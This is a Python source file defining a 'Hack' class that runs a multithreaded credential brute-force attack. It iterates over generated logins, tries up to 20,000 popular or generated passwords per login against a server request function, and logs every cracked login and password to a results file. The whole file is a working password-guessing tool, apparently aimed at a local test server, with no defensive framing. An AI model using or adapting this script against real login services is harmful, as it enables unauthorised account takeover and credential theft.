from generators import simple_login_generator
from generators import popular_password_generator, password_generator, brute_force_generator
from requesters import myserver
import threading
class Hack:

    def __init__(self, login_generator=None, password_generator=None,
                 limit_passwords_per_login=100, result_filename="result.txt", request=None):
        '''

        :param login_generator: fucntion for generate login
        :param password_generator: function for generate password
        :param limit_passwords_per_login: limit of passwords on a login
        :param result_filename: when will we write passwords and login
        :param request: fuction do a request
        '''
        self.login_generator = login_generator
        self.password_generator = password_generator
        self.limit_passwords_per_login = limit_passwords_per_login
        self.result_filename = result_filename
        self.request = request
    def attack(self):
        login_generator = self.login_generator()
        login = login_generator.next()
        treads = []
        while login is not None:
            #self.attack_login(login)
            thread = threading.Thread(target=self.attack_login, args=[login])
            thread.start()
            treads.append(thread)
            login = login_generator.next()
        for thread in treads:
            thread.join()
    def attack_login(self, login):
        password_generator = self.password_generator()
        for i in range(self.limit_passwords_per_login):
            password = password_generator.next()
            if password is None:
                break
            print(f"Trying {login=} {password} ...")
            success = self.request(login, password)
            if success:
                print(f'SUCCESS! {login=} {password=}')
                with open(self.result_filename, 'a') as result_file:
                    result_file.write(f'{login=} {password=}\n')
                break


hack = Hack(login_generator=simple_login_generator.Generator,
            password_generator=popular_password_generator.Generator,
            request=myserver.request,
            limit_passwords_per_login=20000)
hack.attack()
